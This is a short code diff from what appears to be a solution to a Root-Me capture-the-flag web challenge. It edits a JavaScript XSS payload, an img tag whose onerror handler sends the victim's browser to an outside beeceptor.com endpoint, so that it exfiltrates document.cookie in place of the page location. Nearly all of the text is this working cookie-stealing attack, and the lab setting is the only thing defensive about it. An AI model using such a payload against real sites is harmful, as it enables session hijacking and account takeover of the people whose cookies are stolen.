@@ -7,7 +7,7 @@
         // Redirect to the target page
         window.onload = function () {
             const targetURL = "http://challenge01.root-me.org:58003/login";
-            const payload = "<img src=x onerror="window.location='https://iamevil.free.beeceptor.com/?session='+document.location"/>";
+            const payload = "<img src=x onerror="window.location='https://iamevil.free.beeceptor.com/?session='+document.cookie"/>";
 
             // Create a hidden iframe to interact with the target page
             const iframe = document.createElement('iframe');
